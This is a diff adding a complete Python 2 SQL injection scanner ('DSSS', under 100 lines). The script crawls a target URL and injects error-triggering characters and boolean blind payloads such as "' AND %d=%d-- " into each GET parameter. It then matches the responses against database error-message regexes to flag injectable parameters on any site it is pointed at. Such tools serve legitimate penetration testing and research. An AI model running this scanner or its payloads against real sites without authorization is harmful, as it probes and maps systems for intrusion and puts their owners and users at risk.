@@ -1,0 +1,98 @@
+#!/usr/bin/env python
+
+import difflib, httplib, optparse, random, re, sys, urllib2, urlparse
+
+NAME    = "Damn Small SQLi Scanner (DSSS) < 100 LOC (Lines of Code)"
+VERSION = "0.1c"
+AUTHOR  = "Miroslav Stampar (http://unconciousmind.blogspot.com | @stamparm)"
+LICENSE = "GPLv2 (www.gnu.org/licenses/gpl-2.0.html)"
+NOTE    = "This is a fully working PoC proving that commercial (SQLi) scanners can be beaten under 100 lines of code (blind, error, depth 1 crawler)"
+
+INVALID_SQL_CHAR_POOL = ['(',')','\'','"']
+SUFFIXES = ["", "-- ", "#"]
+PREFIXES = [" ", ") ", "' ", "') "]
+BOOLEANS = ["AND %d=%d", "OR NOT (%d=%d)"]
+MINVAL, MAXVAL = 100, 255
+TEXT, HTTPCODE, TITLE, HTML = range(4)
+
+DBMS_ERRORS = {
+    "MySQL" : (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),\
+    "PostgreSQL" : (r"PostgreSQL.*ERROr", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),\
+    "Microsoft SQL Server" : (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"Exception Details:.*\WSystem\.Data\.SqlClient\.", r"Exception Details:.*\WRoadhouse\.Cms\."),\
+    "Microsoft Access" : (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),\
+    "Oracle" : (r"ORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),\
+    "IBM DB2" : (r"CLI Driver.*DB2", r"DB2 SQL error", r"db2_connect\(", r"db2_exec\(", r"db2_execute\(", r"db2_fetch_"),\
+    "Informix" : (r"Exception.*Informix"),\
+    "Firebird" : (r"Dynamic SQL Error", r"Warning.*ibase_.*"),\
+    "SQLite" : (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::"),\
+    "SAP MaxDB" : (r"SQL error.*POS([0-9]+).*", r"Warning.*maxdb.*"),\
+    "Sybase" : (r"Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),\
+    "Ingres" : (r"Warning.*ingres_", r"Ingres SQLSTATE", r"Ingres\W.*Driver")
+}
+
+def retrieveContent(url):
+    retVal = {HTTPCODE : httplib.OK}
+    try:
+        retVal[HTML] = urllib2.urlopen(url.replace(" ", "%20")).read()
+    except Exception, e:
+        retVal[HTML] = e.read() if hasattr(e, 'read') else ""
+        retVal[HTML] = e.msg if hasattr(e, 'msg') else retVal[HTML] or ""
+        retVal[HTTPCODE] = e.code if hasattr(e, 'code') else None
+    match = re.search(r"<title>(?P<title>[^<]+)</title>", retVal[HTML])
+    retVal[TITLE] = match.group("title") if match else ""
+    retVal[TEXT] = re.sub(r"(?s)<script.+?</script>|<!--.+?-->|<style.+?</style>|<[^>]+>|\s", " ", retVal[HTML])
+    retVal[TEXT] = re.sub(r"\s{2,}", " ", retVal[TEXT])
+    return retVal
+
+def shallowCrawl(url):
+    retVal = set([url])
+    page = retrieveContent(url)[HTML]
+    for match in re.finditer(r"href\s*=\s*\"(?P<href>[^\"]+)\"", page, re.I):
+        link = urlparse.urljoin(url, match.group("href"))
+        if reduce(lambda x, y: x == y, map(lambda x: urlparse.urlparse(x).netloc.split(':')[0], [url, link])):
+            retVal.add(link)
+    return retVal
+
+def scanPage(url):
+    retVal = False
+    for link in shallowCrawl(url):
+        print "* scanning: %s%s" % (link, " (no GET parameters)" if '?' not in link else "")
+        for match in re.finditer(r"(?:[?&;])((?P<parameter>\w+)=[^&;]+)", link):
+            vulnerable = False
+            tampered = link.replace(match.group(0), match.group(0) + "".join(random.sample(INVALID_SQL_CHAR_POOL, len(INVALID_SQL_CHAR_POOL))))
+            content = retrieveContent(tampered)
+            for dbms in DBMS_ERRORS:
+                for regex in DBMS_ERRORS[dbms]:
+                    if not vulnerable and re.search(regex, content[HTML], re.I):
+                        print " (o) parameter '%s' could be SQLi vulnerable! (%s error message)" % (match.group('parameter'), dbms)
+                        retVal = vulnerable = True
+            if not vulnerable:
+                original = retrieveContent(link)
+                a, b = random.randint(MINVAL, MAXVAL), random.randint(MINVAL, MAXVAL)
+                for prefix in PREFIXES:
+                    for boolean in BOOLEANS:
+                        for suffix in SUFFIXES:
+                            if not vulnerable:
+                                template = "%s%s%s" % (prefix, boolean, suffix)
+                                payloads = {True: link.replace(match.group(0), match.group(0) + (template % (a, a))), False: link.replace(match.group(0), match.group(0) + (template % (a, b)))}
+                                contents = {True: retrieveContent(payloads[True]), False: retrieveContent(payloads[False])}
+                                if any(map(lambda x: original[x] == contents[True][x] != contents[False][x], [HTTPCODE, TITLE])) or len(original[TEXT]) == len(contents[True][TEXT]) != len(contents[False][TEXT]):
+                                    vulnerable = True
+                                else:
+                                    ratios = map(lambda x: difflib.SequenceMatcher(None, original[TEXT], x).quick_ratio(), [contents[True][TEXT], contents[False][TEXT]])
+                                    vulnerable = ratios[0] > 0.95 and ratios[1] < 0.95
+                                if vulnerable:
+                                    print " (i) parameter '%s' appears to be SQLi vulnerable! (\"%s\")" % (match.group('parameter'), payloads[True])
+                                    retVal = True
+    return retVal
+
+if __name__ == "__main__":
+    print "%s #v%s\n by: %s\n" % (NAME, VERSION, AUTHOR)
+    parser = optparse.OptionParser(version=VERSION)
+    parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.htm?id=1\")")
+    options, _ = parser.parse_args()
+    if options.url:
+        result = scanPage(options.url if options.url.startswith("http") else "http://%s" % options.url)
+        print "\nscan results: %s vulnerabilities found" % ("possible" if result else "no")
+    else:
+        parser.print_help()
